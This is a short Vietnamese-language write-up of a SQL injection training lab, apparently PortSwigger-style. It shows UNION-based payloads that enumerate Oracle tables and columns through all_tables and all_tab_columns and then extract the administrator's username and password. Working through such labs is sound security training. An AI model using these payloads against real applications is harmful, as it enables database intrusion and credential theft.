# SQL Injection Lab 06: List Database Contents on Oracle

## Mục tiêu
Liệt kê bảng/cột trên Oracle và lấy mật khẩu của `administrator`.

<img src="images/06_list-db-oracle-2026-04-14-21-46-33.png" alt="Lab overview" width="760" />
<br><br>

## Các bước chính
1. Dò số cột và cột hiển thị text như các lab trước.

<img src="images/06_list-db-oracle-2026-04-14-21-50-34.png" alt="Column probing" width="760" />
<br><br>

2. Liệt kê tên bảng trên Oracle (`all_tables`):

```sql
' union select table_name, null from all_tables --
```

<img src="images/06_list-db-oracle-2026-04-14-21-52-17.png" alt="List Oracle tables" width="760" />
<br><br>

3. Xác định bảng users: `USERS_XQFOYY`.

<img src="images/06_list-db-oracle-2026-04-14-21-54-19.png" alt="Users table found" width="760" />
<br><br>

4. Liệt kê cột của bảng users (`all_tab_columns`):

```sql
' union select column_name, null from all_tab_columns where table_name = 'USERS_XQFOYY' --
```

<img src="images/06_list-db-oracle-2026-04-14-21-58-02.png" alt="List columns in users table" width="760" />
<br><br>

5. Lấy username/password của `administrator`:

```sql
' union select USERNAME_JVDZSM, PASSWORD_NKGTUE from USERS_XQFOYY where USERNAME_JVDZSM = 'administrator' --
```

<img src="images/06_list-db-oracle-2026-04-14-22-01-15.png" alt="Administrator credentials" width="760" />
<br><br>

6. Dùng mật khẩu lấy được để đăng nhập `administrator` và solve lab.

<img src="images/06_list-db-oracle-2026-04-14-22-02-45.png" alt="Lab solved" width="760" />
<br><br>

## Payload solve

```sql
' union select USERNAME_JVDZSM, PASSWORD_NKGTUE from USERS_XQFOYY where USERNAME_JVDZSM = 'administrator' --
```
